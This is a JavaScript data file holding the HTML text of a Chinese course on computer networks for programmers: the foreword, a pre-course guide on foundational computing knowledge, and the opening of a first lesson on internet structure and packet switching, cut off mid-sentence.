exports.category = "computer";
exports.title = "计算机网络通关29讲";
exports.data = [
  {
    chapterTitle: "开篇词",
    children: [
      {
        content:
          '<p data-nodeid="1333" class="">你好，发现求知的乐趣，我是你的老朋友林䭽。</p>\n<p data-nodeid="1334">第一次和大家见面，是 2020 年 9 月，我在拉勾教育平台推出的<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1441">《重学操作系统》</a>专栏，并且收到了一致好评。通过留言区、社群和大家交流后发现，很多同学对网路这块知识比较匮乏，形不成体系化概念。</p>\n<p data-nodeid="1335">于是我就萌生了再出一门面向程序员的基础课程——《计算机网络》的想法，带你用 300 分钟系统地建立计算机网络相关知识体系，内容可以覆盖<strong data-nodeid="1456">大厂</strong>架构师<strong data-nodeid="1457">岗位面试</strong>以及<strong data-nodeid="1458">实际工作中所需</strong>的网络知识。</p>\n<h3 data-nodeid="1336">为什么要学习计算机网络</h3>\n<p data-nodeid="1337">记得我还在阿里工作的时候，午餐期间和几个面试官聊起了上午发生的一起事故。因为 TCP 队头阻塞，没有预备方案，导致分布式集群中部分服务发生延迟，最后有一个系统雪崩。于是大家就开始罗列自己遇到的各种网络问题，比如：</p>\n<ul data-nodeid="1338">\n<li data-nodeid="1339">\n<p data-nodeid="1340">有的遇到 DDoS</p>\n</li>\n<li data-nodeid="1341">\n<p data-nodeid="1342">有的遇到 DNS 劫持</p>\n</li>\n<li data-nodeid="1343">\n<p data-nodeid="1344">有的遇到跨机房通信问题</p>\n</li>\n<li data-nodeid="1345">\n<p data-nodeid="1346">……</p>\n</li>\n</ul>\n<p data-nodeid="1347">既然网络可以作为面试官们的饭后谈资，那么在面试中肯定也经常被问到，说实话，我自己作为面试官，也很喜欢考察候选人关于网络的问题。</p>\n<p data-nodeid="1348">原因很简单，<strong data-nodeid="1471">网络是一种工作技能，我需要通过几个网络知识的问答，确认求职者未来是否会给我带来很大“麻烦”</strong>。而据我观察，大部分求职者都不能游刃有余地应对：</p>\n<ul data-nodeid="1349">\n<li data-nodeid="1350">\n<p data-nodeid="1351">很多候选人在回答“TCP 为什么要 3 次握手”这样简单的问题时，就像背经文一样，没有自己的理解；</p>\n</li>\n<li data-nodeid="1352">\n<p data-nodeid="1353">当面对“HTTPS 协议的 TTFB 传输时间”这类需要将 TCP 的原理和 HTTPS 结合起来思考的问题，就更加束手无策。</p>\n</li>\n</ul>\n<p data-nodeid="1354">此外，工作当中也经常要用到计算机网络的知识，而且一旦用错就容易造成灾难性的后果，给公司直接带来经济损失。</p>\n<p data-nodeid="1355">但实际情况是，很多程序员对网络相关的知识一知半解，不足以应对日常的工作需求。我自己做团队 Leader 时，就深有体会：</p>\n<ul data-nodeid="1356">\n<li data-nodeid="1357">\n<p data-nodeid="1358">团队里多数成员遇到网络故障（如 DNS 故障）时，由于没有系统性地学习过网络相关的知识，对Linux 下，诸如 nslookup、telnet、lsof、netstat 等网络相关的指令一知半解，导致不知道如何定位问题；</p>\n</li>\n<li data-nodeid="1359">\n<p data-nodeid="1360">很多人使用 TCP 连接时，只考虑收发数据，不能考虑到队头阻塞、多路复用等问题，导致经常出现系统负载不高，但是吞吐量很低的情况。</p>\n</li>\n</ul>\n<p data-nodeid="1361">看到上面这些场景，我相信大部分同学定会感同身受。作为过来人，我可以负责任地说：<strong data-nodeid="1491">一名程序员，无论是应对日常开发、日常排查，还是解决突发的网络问题（网络调试、网络优化）都离不开计算机网络</strong>。而<strong data-nodeid="1492">要想成为优秀的工程师、架构师，朝着更高阶、更高薪的岗位去晋升</strong>，补足编程必备基础知识——<strong data-nodeid="1493">计算机网络是绕不过去的一关</strong>。</p>\n<p data-nodeid="3670" class="te-preview-highlight">对程序员来说，计算机网络解决的是常识问题，有了这些常识，你才能更好地利用工具解决工作中的问题。比如用 telnet 调试远程服务、用 Whireshark 抓包定位网络故障；再比如把 ulimit 设置成多少？Dubbo 异步单一连接扛不住了该怎么办？用 HTTP 协议的 Keep-Alive 维持心跳可不可行？等等。</p>\n\n\n\n\n<p data-nodeid="1363">在工作中，当你想快速进入一个领域开发程序，马上就会面临诸如：我用哪个协议？用哪个网络框架？如果计算机网络知识不扎实，很容易选错；另外，你也没有办法优化参数，或者当你承接了系统优化的工作时，由于计网知识不扎实，会陷入无穷无尽的学习。比如今天碰到 TCP 队头阻塞，明天碰到滑动窗口，后天碰到 ARP 和路由算法。</p>\n<p data-nodeid="1364">其实计网不是难，而是知识点太多！<strong data-nodeid="1501">系统性地学习计网需要花很多时间，直接看面试题的解答又不能理解其精髓。</strong> 因此，很多概念往往需要反反复复学习。这就导致你时常陷入一个时间黑洞，重复学习却仍然不会解决工作中遇到的常见问题和应对面试。</p>\n<p data-nodeid="1365">所以我觉得，<strong data-nodeid="1507">你确实有必要拿出一小部分时间，补足计算机网络这块知识</strong>。</p>\n<h3 data-nodeid="1366">我是如何设计这门课程的</h3>\n<p data-nodeid="1367">萌生了设计一门网络的课程后，我又花了大量时间去研究目前市场上相关的学习资料，大致可以总结为四类：</p>\n<ul data-nodeid="1368">\n<li data-nodeid="1369">\n<p data-nodeid="1370">第一类是大学课程和经典教材，优势是全面，缺点是 4/5 的内容不会直接在工作和面试中使用。因此你们都不愿意花时间。</p>\n</li>\n<li data-nodeid="1371">\n<p data-nodeid="1372">第二类是面经类资料（帖子、博文），对于基础薄弱的人来说，东一榔头、西一棒槌地自学，很难形成知识体系，在工作和面试时无法应对自如。</p>\n</li>\n<li data-nodeid="1373">\n<p data-nodeid="1374">第三类是专业图书，由于网络相关的知识非常多而繁杂，相应的专业书籍数量非常多而且体量大，对网络初学者和应对面试者来说并不友好。</p>\n</li>\n<li data-nodeid="1375">\n<p data-nodeid="1376">最后一类便是付费类在线课程，基本上也是内容覆盖面较广，不够聚焦。</p>\n</li>\n</ul>\n<p data-nodeid="1377">显然，这些浅尝辄止的工具类资料只能辅助你做日常知识积累，并不能让你在工作中出类拔萃、在面试过程中脱颖而出。</p>\n<p data-nodeid="1378">随着和你们的交流越来越多，我渐渐发现，对于一些“有技术追求”的开发人员来说，他们会更关注底层原理，而网络便是编程必备的底层基础知识。</p>\n<p data-nodeid="1379">因此我想专门为程序员设计一门课程，从<strong data-nodeid="1525">基础结构、工作原理、应用场景</strong>三个维度，帮你系统性地梳理和讲解计算机网络知识，学完之后，<strong data-nodeid="1526">足以应对互联网大厂研发岗位“计网”相关的面试题目，解决日常工作场景中遇到的网络问题</strong>。专栏所讲知识覆盖了大学内容的 1/5，但是工作、面试只需要用这 1/5 就能很出彩。为了方便你理解，我整理了一份计算机网络知识地图，如下图所示：</p>\n<p data-nodeid="1380"><img src="https://s0.lgstatic.com/i/image6/M01/38/81/Cgp9HWB5WTuAFewMAAQkN4m6j9E321.png" alt="图片1.png" data-nodeid="1529"></p>\n<p data-nodeid="1381">下面我会从以上三个维度逐一和你说叨说叨。</p>\n<h4 data-nodeid="1382">第一个维度：网络的基础结构</h4>\n<p data-nodeid="1383">这块内容是为了带你了解计算机网络的生态和基础设施。我会和你讨论日常生活和工作中常见的东西，比如路由器、交换机、终端、基站等，介绍它们背后隐含的网络，比如公司网络、家庭网络、网络边界等，以及组织它们工作的网络协议栈，TCP/UDP/IP 等。</p>\n<p data-nodeid="1384">你可能会说：老师你讲的这些东西，只有后端面试才会用到，我是前端工程师，平时只用 HTTP 协议就够了。说到这，我想和你分享一个曾经发生在我团队里的故事。</p>\n<blockquote data-nodeid="1385">\n<p data-nodeid="1386">8 年前我负责过一个首页日 PV 在百万级别的电商类网站。团队里有一个前端工程师，看到首页有 100 多个卡片，突发奇想地做前端组件化，本来是想解决组件和服务间依赖的问题，让每个卡片自己发请求到服务端。由于上线比较晚，代码 Review 的时候并没有发现，结果变更提交到了线上。</p>\n<p data-nodeid="1387">可想而知，当天半夜，睡梦中的我被电话吵醒了，客服说：“服务器挂了。”</p>\n<p data-nodeid="1388">这是什么原因导致的呢？要知道每个卡片单独发请求，我们每次打开网站首页，都会发送上百个请求到服务端。这位前端同学的处理方式，直接把服务器的请求数量提升到亿级别，相当于做了一次压力测试和人肉 DDoS。</p>\n<p data-nodeid="1389">有同学说，不知者无罪，毕竟 HTTP 协议里没有讲“不能发送这么多请求”。可是，网络是有吞吐量限制的，这是一个常识问题。<strong data-nodeid="1542">所谓常识，就是作为工程师本应掌握的知识</strong>。</p>\n<p data-nodeid="1390">听完这个故事，服务端同学可能很开心，暗自窃喜：“我们服务端，肯定不会犯这种常识性错误。”</p>\n<p data-nodeid="1391">那我只能再次用事实“说话”了。原来团队里有一个服务端同学，负责维护一个中间层。请求到达中间层，还需要去其他内部服务请求数据，然后组装统一返回。结果中间层很不稳定，经常出现延迟很高，而且内存使用很高的情况。</p>\n<p data-nodeid="1392">我 DUMP 了一下内存，发现大量连接对象。经过排查，是因为接收每个请求，系统都会建立很多个到其他服务的连接。在网络波动期，连接持续积压，导致频繁创建 Socket 文件，最终超过操作系统的限制崩溃。</p>\n<p data-nodeid="1393">你可能会说，这是一个技术问题，可以用多路复用、长连接、队列等方式解决。但是抛开这些专业的网络 + IO 技术问题，这是不是一个常识问题呢？答案当然是。因为网络连接是有成本的，而且网络是不稳定的。不稳定的情况下，连接数应当有所限制。</p>\n</blockquote>\n<h4 data-nodeid="1394">第二个维度：工作原理</h4>\n<p data-nodeid="1395">这块内容将介绍网络的工作原理，里面会涉及一些算法问题，比如滑动窗口、路由和寻址。还会涉及细节问题，比如讲解一些封包格式，但更多的是让你理解网络的工作原理，比如多路复用、缓存设计、Socket、I/O 模型等。</p>\n<p data-nodeid="1396"><strong data-nodeid="1552">有同学说，网络库一大堆，用就好了，还有必要理解原理吗？是啊，年轻的“萌新”可能都有这个想法。</strong></p>\n<blockquote data-nodeid="1397">\n<p data-nodeid="1398">记得在前两年，团队里有个同学发布了一个数据量千万级资源仓库，用 RPC 公布了一个开放服务给大家用。本地集群压测报告 QPS 3000，于是这位同学找领导汇报，领导也很高兴。</p>\n<p data-nodeid="1399">服务上线之前，幸好有另一位工程师对这个 3000 QPS 的设计很感兴趣。自己又写了一个压测程序，远程调用测试集群压测，结果在 1000 QPS 就打挂了。</p>\n<p data-nodeid="1400">这是怎么回事呢？因为 3000 的 QPS 是在最邻近的网络节点，用少量连接测试得到的结果。1000 QPS 则是模拟了一个延迟较高的网络，用较高的并发数连接测试的结果。</p>\n</blockquote>\n<p data-nodeid="1401">所以你凭直觉说，哪份测试报告更加靠谱？当然第二份报告更有意义，网络是一个不稳定的环境，服务端随时面临大量的并发连接。<strong data-nodeid="1561">大家都使用网络库，但是如何根据自己的业务场景、网络特性、I/O 特性、计算资源特性，优化网络，这就需要你了解网络的工作原理了</strong>。</p>\n<h4 data-nodeid="1402">第三个维度：应用场景</h4>\n<p data-nodeid="1403">我相信这部分的意义并不需要我过多强调，这些就是你日常工作需要且每天都在用的东西，只不过你平时用得并不深，但是我要在课程中带你深挖一下这块内容。比如：</p>\n<ul data-nodeid="1404">\n<li data-nodeid="1405">\n<p data-nodeid="1406">HTTPS 协议握手的过程？</p>\n</li>\n<li data-nodeid="1407">\n<p data-nodeid="1408">RPC 是如何工作的？</p>\n</li>\n<li data-nodeid="1409">\n<p data-nodeid="1410">IM 系统是如何工作的？</p>\n</li>\n<li data-nodeid="1411">\n<p data-nodeid="1412">抓包用什么工具？</p>\n</li>\n<li data-nodeid="1413">\n<p data-nodeid="1414">要注意什么安全攻防？</p>\n</li>\n<li data-nodeid="1415">\n<p data-nodeid="1416">网络出了问题怎么排查？</p>\n</li>\n</ul>\n<p data-nodeid="1417">这部分的意义反而是最容易理解的，所以我就不再赘述了。</p>\n<h3 data-nodeid="1418">课程设置</h3>\n<p data-nodeid="1419">我设计这门课的目的，是帮助你<strong data-nodeid="1597">系统地解决</strong>计算机网络相关的<strong data-nodeid="1601">面试问题，<strong data-nodeid="1598">每个模块对应一个</strong>热门的面试方向，<strong data-nodeid="1599">每一讲都会</strong>以高频面试题为引，<strong data-nodeid="1600">介绍这个方向上涉及的重点内容</strong>，引出</strong>很多大家在工作中关心的<strong data-nodeid="1602">问题和技术难点</strong>。深度不超过工程师必备的范畴，但是也不低于阿里、腾讯等一线大厂专家研发岗级别的面试要求。</p>\n<p data-nodeid="1420">基于以上思路，我把课程分为 5 个模块，共计 29 讲。为了方便你理解，我绘制了计算机网络的知识体系图：</p>\n<p data-nodeid="1421"><img src="https://s0.lgstatic.com/i/image6/M01/3A/47/Cgp9HWB-t1mALDUrAAoRXwvDdDE351.png" alt="图片1111.png" data-nodeid="1606"></p>\n<p data-nodeid="1422"><strong data-nodeid="1610">模块一：互联网和传输层协议</strong></p>\n<p data-nodeid="1423">介绍互联网的体系和整体框架，参与的硬件设备，以及它们的作用。还会介绍传输层协议 TCP 和 UDP，重点讨论它们的工作原理、算法和优化策略。这部分知识是计算机网络的基础，也最能体现网络设计的精髓。</p>\n<p data-nodeid="1424"><strong data-nodeid="1615">模块二：网络层协议</strong></p>\n<p data-nodeid="1425">围绕局域网和 IP 协议展开，包括 ARP、IPv4、IPv6、NAT 等基本概念，探讨 IPv6 的工作原理，以及 IPv6 和 IPv4 的兼容策略。<strong data-nodeid="1625">IP 协议</strong>几乎是网络层的唯一协议，是<strong data-nodeid="1626">大厂面试最为热门的内容之一</strong>。模块一和模块二属于基础篇，是计算机网络最底层的基础知识。</p>\n<p data-nodeid="1426"><strong data-nodeid="1630">模块三：网络编程</strong></p>\n<p data-nodeid="1427">围绕 Socket 讨论网络编程，介绍各种网络 I/O 模型和编程方式的优缺点，并以 RPC 框架设计为题去落地学到的这些知识和实现。讨论在不同的并发量、针对不同服务特性选择不同的 I/O 模型，调整 TCP 关联的参数，等等，进而帮助你学习如何优化自己系统的网络。这部分内容会为企业带来实际价值，因此面试官会重点提问。</p>\n<p data-nodeid="1428"><strong data-nodeid="1635">模块四：Web 技术</strong></p>\n<p data-nodeid="1429">讨论平时<strong data-nodeid="1641">使用最多且最重要的应用层协议——HTTP 协议</strong>（包括 HTTP 2.0），并扩大讨论范围到 Web 技术生态，比如从 DNS 看缓存、从 CDN 看负载均衡、从 HTTP 协议看开发规范、从流媒体技术看协议选择，以及从爬虫技术看网络安全。</p>\n<p data-nodeid="1430"><strong data-nodeid="1645">模块五：网络安全</strong></p>\n<p data-nodeid="1431">讨论网络安全技术，一部分是基础设施，比如证书、加解密、公私钥体系、信任链等；另一部分是具体的攻击手段，比如 DDoS、XSS、SQL 注入、ARP 攻击、中间人攻击等，以及它们的防御手段。<strong data-nodeid="1651">安全是所有互联网公司的高压线</strong>，学完这块内容能够帮助你屏蔽掉一些高危操作，在工作中避免出现安全问题。</p>\n<h3 data-nodeid="1432">讲师寄语</h3>\n<p data-nodeid="1433" class="">现在技术迭代很快，而计算机网络相关的知识能帮助你更快适应新技术。很多同学时常感叹“<strong data-nodeid="1658">怎么又有新技术了？现有的技术还没学明白呢</strong>”，出现这类困扰的根本原因是你的基础知识不牢固。</p>\n<p data-nodeid="1434">俗话说，练武不练功，到老一场空。计算机领域则不同，如果你的基础知识不扎实，学习速度就会跟不上新知识的出现速度，很快被行业淘汰。但对于计算机基础好的同学来说，新技术的出现是为了用更简单的技术解决更复杂的问题。这也是我开发<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1662">《重学操作系统》</a>和《计算机网络通关 29 讲》课程的最大初衷，让程序员不苦恼于频繁迭代的技术，抓住源头，认清本质。</p>\n<p data-nodeid="1435">学习计算机网络实际上是加强对未来的适应，有利于你扩宽自己的应用开发的面。而不是每当一个新技术出现，对你来说都是一个全新的技术。</p>\n<p data-nodeid="1436" class="">发现求知的乐趣，我是林䭽。下一讲，我想和你聊聊程序员如何打牢基础。</p>',
        article_title: "开篇词 | 一次搞定计算机网络，高效修炼程序员内功",
        title: "开篇词 | 一次搞定计算机网络，高效修炼程序员内功",
        id: 7263,
      },
      {
        content:
          '<p data-nodeid="9665" class="">在正式讨论之前，我想先问两个问题：</p>\n<ul data-nodeid="9666">\n<li data-nodeid="9667">\n<p data-nodeid="9668"><strong data-nodeid="9740">程序员应该具备的基础知识指的是什么</strong>？</p>\n</li>\n<li data-nodeid="9669">\n<p data-nodeid="9670"><strong data-nodeid="9745">计算机领域的基础指的又是什么</strong>？</p>\n</li>\n</ul>\n<p data-nodeid="9671">举个例子，C 罗一脚把球踢进了对方的球门，这充分体现了物体之间的作用是相互的，所以足球运动的基础是物理学。</p>\n<p data-nodeid="9672">你觉得这句话有什么问题吗？要我说，上述的讨论脱离了 Context，翻译成中文是“上下文”。</p>\n<p data-nodeid="9673">那什么是上下文呢？比如某场足球比赛，大家纷纷讨论 C 罗射门进球，这个话题讨论的其实是他高超的球技。</p>\n<p data-nodeid="9674"><strong data-nodeid="9765">计算机领域也是一样，上下文指的是计算的背景和环境</strong>。我们说一个应用架构好，体现了程序员高超的应用开发能力。既然是应用开发能力，那么它的基础就不应该是电子和数学。程序员写<strong data-nodeid="9766">程序</strong>，程序经过编译后变成<strong data-nodeid="9767">应用</strong>，应用执行起来就是<strong data-nodeid="9768">进程</strong>。</p>\n<p data-nodeid="9675">在日常生活里，用户浏览网页时看到的是图形，用鼠标点按钮的背后是<strong data-nodeid="9782">显卡和中断</strong>；用户以为自己每天使用的是应用，实则是进程；用户模糊地知道，连麦是把<strong data-nodeid="9783">光电信号</strong>传输过去，而程序员明确地知道，用户通过<strong data-nodeid="9784">网络协议传输了二进制数据</strong>；用户以为通过微信就可以直接把消息发给张三，但其实消息首先到达的是微信服务器。</p>\n<p data-nodeid="9676">如果你是一名程序员，会很清楚地知道以上这些“表象”背后的“实质”，这便是程序员的基础知识。</p>\n<h3 data-nodeid="9677">为什么程序员要打牢基础？</h3>\n<p data-nodeid="9678">正如开篇词中所说，2020 年 9 月，我在拉勾教育平台推出<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="9790">《重学操作系统》</a>专栏，至今仍有不少同学和我交流，表示课程切实地帮助他们补齐了操作系统领域的基础知识短板，有些同学通过大厂面试拿到了不错的 Offer，并且能够将专栏中的知识运用到工作当中，去解决一些实际问题。</p>\n<p data-nodeid="9679">我收到了大量诸如此类的评价，说明大家确实需要一些通俗易懂、能将实战和理论讲透、专门给工程师打造的课程。而且我平时面试候选人、与团队里的小伙伴们交流，也让我更加确信：大部分工程师的基础知识掌握得并不扎实。</p>\n<p data-nodeid="9680"><strong data-nodeid="9801">程序员学好基础知识，是为了更好地开发应用、开发服务</strong>。相信你也听过，大牛们常对小年轻们说，要“<strong data-nodeid="9802">打牢基础</strong>”，但是你现在可能还不知道所谓的基础有哪些，</p>\n<p data-nodeid="9681">基础知识，就好像是瓦纳大陆中构造整个世界的七种元素一样，有独自的能力，又可以互相反应。因此，学好计算机领域的基础知识，你会受到更多大厂的青睐，遇到更好的机遇，拿到含金量更高的 Offer。特别是别人在你的项目中，也会感叹这精妙的设计和扎实的内功。</p>\n<p data-nodeid="9682">那么接下来我们就具体聊聊，构成应用程序的 7 种基本元素——也就是大牛们所说的“基础”，关于如何“打牢”，不要急，你也能从下文中找到答案。</p>\n<h3 data-nodeid="9683">构成应用的 7 种基础元素</h3>\n<p data-nodeid="9684"><img src="https://s0.lgstatic.com/i/image6/M01/39/CF/CioPOWB87oeACgMQAAC_jD-PExg613.png" alt="2021419-104354.png" data-nodeid="9808"></p>\n<h4 data-nodeid="9685">1. 计算机组成原理</h4>\n<p data-nodeid="9686">讲述的是计算机是什么？计算是怎么回事？硬件如何为应用提供计算？作为工程师你只需要了解核心知识即可，我在<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="9815">《重学操作系统》</a>专栏中作为一个单独的章节（模块一），已经向大家介绍过了。其实计算机组成原理中涉及很多有趣的常识问题，比如能不能写一个程序判断计算机是不是开机状态？你可以思考这个问题，然后在留言区和我互动。</p>\n<h4 data-nodeid="9687">2. 操作系统</h4>\n<p data-nodeid="9688">操作系统对于我们最大的实践意义是：如何合理规划应用的生命周期以及资源使用，比如如何处理高并发、如何提升系统的稳定性、如何节约硬件成本等。具体来说学好操作系统，在写应用、服务的时候，就可以对 CPU、磁盘、内存、网络等资源进行合理规划，达到较高的利用率。所以，每个应用开发者都需要重视这块知识。</p>\n<p data-nodeid="9689">如果你想了解数据库、分布式文件系统、协程的底层实现，都可以从这门课开始了解……感兴趣的同学，也可以学习我的<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="9824">《重学操作系统》</a>专栏。</p>\n<h4 data-nodeid="9690">3. 计算机网络</h4>\n<p data-nodeid="9691"><strong data-nodeid="9833">计算机网络</strong>也是本专栏的主角，讲的是应用之间如何进行通信、如何设计应用之间的契约，形成稳定、高效、规范的协作关系（也就是协议）；并通过优化网络的性能，最终节省成本或者让用户满意。比如你：</p>\n<ul data-nodeid="9692">\n<li data-nodeid="9693">\n<p data-nodeid="9694">为了让页面秒开、服务秒回，做出的所有的努力；</p>\n</li>\n<li data-nodeid="9695">\n<p data-nodeid="9696">为了优化网络传输细节，去调整 TCP 的滑动窗口；</p>\n</li>\n<li data-nodeid="9697">\n<p data-nodeid="9698">为了提升网络的吞吐量、减少延迟，去开启多路复用能力；</p>\n</li>\n<li data-nodeid="9699">\n<p data-nodeid="9700">为了避免 Downtime，去调整网络的连接池和线程数；</p>\n</li>\n<li data-nodeid="9701">\n<p data-nodeid="9702">为了开发某个应用，尝试去理解一些应用层协议，比如 SSH、RTCP、HTTP2.0， MQTT 等；</p>\n</li>\n<li data-nodeid="9703">\n<p data-nodeid="9704">为了做好日常开发，去理解一些基本概念，比如 DNS、CDN、NAT、IPv4/6 等。</p>\n</li>\n</ul>\n<p data-nodeid="9705">今天，计算机网络已经成为应用提供价值最重要的一环。</p>\n<p data-nodeid="9706">自从人们可以上网浏览图片后，逐渐吸引了大量人去冲浪。从互联网起步，到今天几十亿个网站，全球 40 亿网民数量，也就经历了短短几十年。我们的生活被外卖、电商、社交、游戏、娱乐、短视频、金融、电影改变，而这些服务都离不开网络。</p>\n<p data-nodeid="9707">对于我这样的 80 后，刚好完整地感受了这种变化。Web 1.0 时代，我还在浏览门户网站；Web 2.0 时代，我们已经将实体关系搬到了网络上；到了 Web 3.0 时代，计算机技术开始通过网络调度人和设备，为实体分配任务，比如滴滴调度专车司机、美团调度外卖配送员。</p>\n<p data-nodeid="9708">有人说这是互联网下半场的表现，而事实上虚拟现实、智能硬件、自动驾驶的时代，都还没有到来，行业发展仍需要大量的优质人才。</p>\n<p data-nodeid="9709">学完计算机组成原理、操作系统、计算机网络这 3 部分知识，你所学的基础就形成了一个完整的闭环。此时你对硬件、软件的理解，对性能、缓存的理解，都会更进一步。这些看似独立的知识实则相辅相成，比如：</p>\n<ul data-nodeid="9710">\n<li data-nodeid="9711">\n<p data-nodeid="9712">学习网络知识能够让你更深入地看到操作系统的 I/O 和线程模型；</p>\n</li>\n<li data-nodeid="9713">\n<p data-nodeid="9714">学习操作系统会看到对网络的监控、故障排查、端口、CPU 和内存的使用；</p>\n</li>\n<li data-nodeid="9715">\n<p data-nodeid="9716">……</p>\n</li>\n</ul>\n<p data-nodeid="9717">因此，弄清知识之间的内在联系，更有助于形成合力构建自己的知识体系，帮助你成为优秀的工程师、架构师。</p>\n<h4 data-nodeid="9718">4. 算法和数据结构</h4>\n<p data-nodeid="9719">算法和数据结构是两种科学，但是又彼此相互关联。算法是一个计算过程，数据结构是数据的组织方式。无论是计算过程还是数据的组织，我们都需要一个优化的方式——这就是算法和数据结构讨论的问题。</p>\n<p data-nodeid="9720">一个问题，有很多种解决方案，那么你想不想知道最优解是什么？虽然在给定资源的条件下，只要资源没有耗尽，问题得到解决，让用户满意，就不需要最优方案——比如最低的延迟、最少的计算时间、最大的空间利用率。</p>\n<p data-nodeid="9721">但是用户的满意有尽头吗？答案必然是没有。所以，我向你推荐拉勾教育公瑾老师的<a href="https://shenceyun.lagou.com/t/Bxo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="9857">《重学数据结构与算法》</a>专栏。我本人非常喜欢他这种清晰、理性、通俗易懂的授课风格。</p>\n<h4 data-nodeid="9722">5. 图形学</h4>\n<p data-nodeid="9723">图形学讨论的是应用和人之间的交互桥梁。有同学会问，那我不开发带图形的应用，只开发后端服务，还需要学习图形学吗？</p>\n<p data-nodeid="9724">我只能说，如果你对未来的世界，比如电影、VR、AR、虚拟世界、自动驾驶等充满好奇和期待， 可以尝试学一下这门课。特别是想学 AI 的同学，要知道，深度学习把数据看作图片，让 AI 下棋，你以为它在思考，其实它只是从很多图形中找到概率特征。</p>\n<h4 data-nodeid="9725">6. 编程技巧</h4>\n<p data-nodeid="9726">编程不是算法，编程是语言。语言研究的是怎么表达得更清楚。中国自古有信、达、雅的说法，编程也是这样。算法是解决某个实际问题的计算步骤，研究如何让这个计算步骤以最小的代价实现。而编程研究的是怎么用程序表达，阅读起来更方便、维护起来更简单，代码本身就像注释一样清楚。</p>\n<p data-nodeid="9727">这是 7 种元素中，最重要，也是最难的一门科学。其他 6 种元素（基础知识），工程师往往学到一定程度，够用就行，而编程的技艺则需要一直深入学习、不断探索。</p>\n<h4 data-nodeid="9728">7. 编译原理</h4>\n<p data-nodeid="9729">在没有学习这门课程前，想深入任何一门计算机语言的底层，都会有相当大的难度。编译原理讲述的是程序语言如何被实现、源代码又如何被编译成应用。比如你想了解 JVM、V8 等引擎；想了解 Go/C++ 的编译器，从编译原理学起是不错的选择。</p>\n<p data-nodeid="9730">当然，对于应用开发者而言，编译原理提供的最大价值，就是用元编程技术设计自己的领域专有语言，从语言层面降低研发成本、提高交付效率。长此以往，还会发现系统有一些额外的能力是你之前没有想到的。比如 C++ 之父看到有个年轻人用自己设计的 C++ 模板在编译阶段计算圆周率，这就是他万万没有想到的额外能力，这种能力被称为<strong data-nodeid="9878">模板元编程</strong>。</p>\n<h3 data-nodeid="9731">总结</h3>\n<p data-nodeid="9732">7 种元素是组成应用的 7 种基本科学。但不得不说，学习这 7 种元素还是非常耗时耗力的，以《现代操作系统》这本书为例，我第一次学习的时候，耗时 3 个多月；看完《算法导论》足足花了 1 年时间。所以，对于打基础这件事情，我真心建议你不要一上来就啃大部头书籍，而是先找到一门比经典教材浅，但又暂时够用的教程。</p>\n<p data-nodeid="9733">《重学操作系统》和《计算机网络通关 29 讲》，便是能够帮你解决工作中遇到的实际问题，又能帮你应对面试的课程。希望它们可以伴随你的成长过程，为你的程序员进阶之路添砖加瓦。</p>\n<p data-nodeid="9885" class="te-preview-highlight">好的，这次的分享就到这里，发现求知的乐趣，我是林䭽。 下一节课，我们将进入正题，学习“01 | 漫游互联网：什么是蜂窝移动网络？”。</p>',
        article_title: "课前导读 | 程序员如何打好计算机领域的基础？",
        title: "课前导读 | 程序员如何打好计算机领域的基础？",
        id: 7264,
      },
    ],
  },
  {
    chapterTitle: "模块一：互联网和传输层协议",
    children: [
      {
        content:
          '<p data-nodeid="12910" class="">今天我们聊一聊互联网的构成。</p>\n<p data-nodeid="12911">从 DataReportal 2021 年 1 月的统计数据来看，全球 78 亿人口中，有 52 亿手机用户，46 亿互联网用户。</p>\n<p data-nodeid="12912">能够接入网络的设备越来越多，体量越来越大，不知道你有没有好奇过，这样一个庞大的世界是如何被构造出来的？思科（Cisco，世界 500 强通信设备提供商）在一篇报告中曾指出，2016 年年底全球 IP 流量超过 1 个 Zettabyte，也就是 10<sup>21</sup> 个字节，相当于一万亿 GB。那么如此庞大的流量体系，又需要何种结构去承接？</p>\n<p data-nodeid="12913">在本专栏，我们会学习网络协议，比如 TCP/IP 协议、HTTP 协议，还会学习算法，比如时间窗口算法、校验和算法。这些协议和算法，只是整个互联网的一角，而整个互联网的全貌，我将借这次机会带你做一次漫游。</p>\n<h3 data-nodeid="12914">网络的组成</h3>\n<p data-nodeid="12915">我们习惯称今天的时代为云时代，整个世界可以看作一张巨大的、立体的网。在这个时代里产生的各种服务，就好像水和电一样，打开即用。透过这张巨大的网去观察，里面还会有一个个小型的网络。你可以想象，用无数个节点构成一个个小型网络，再用小型网络组成中型网络，再组成大型网络，以此类推，最后组成完整的一个如星河般的世界。</p>\n<h4 data-nodeid="12916">公司内网</h4>\n<p data-nodeid="12917">如果你仔细分析一个小型网络，比如一个公司网络，就会得到下图 1 所示的结构：</p>\n<p data-nodeid="12918"><img src="https://s0.lgstatic.com/i/image6/M01/38/64/Cgp9HWB5O5KAFGFAAAD-82hpYWc483.png" alt="Drawing 2.png" data-nodeid="12983"></p>\n<div data-nodeid="12919"><p style="text-align:center">图 1：公司内网结构示例</p></div>\n<p data-nodeid="12920">公司网络从<strong data-nodeid="12997">本地网络服务提供商 （Internet Service Provider）</strong> 接入，然后内部再分成一个个子网。上图 1 中，你看到的线路，也被称作<strong data-nodeid="12998">通信链路（Communication Link）</strong>，用于传输网络信号。你可以观察到，有的网络节点，同时接入了 2 条以上的链路，这个时候因为路径发生了分叉，数据传输到这些节点需要选择方向，因此我们在这些节点需要进行<strong data-nodeid="12999">交换（Switch）</strong>。</p>\n<p data-nodeid="12921">数据发生交换的时候，会先从一条链路进入交换设备，然后缓存下来，再转发（切换）到另一条路径，如下图 2 所示：</p>\n<p data-nodeid="12922"><img src="https://s0.lgstatic.com/i/image6/M00/38/6D/CioPOWB5O7uAUZ7qAAB_rmbTigw120.png" alt="Drawing 4.png" data-nodeid="13003"></p>\n<div data-nodeid="12923"><p style="text-align:center">图 2：封包交换（Packet Switch）</p></div>\n<p data-nodeid="12924">交换技术的本质，就是<strong data-nodeid="13013">让数据切换路径</strong>。因为，网络中的数据是以分组或封包（Packet）的形式传输，因此这个技术也称作<strong data-nodeid="13014">封包交换技术（Packet 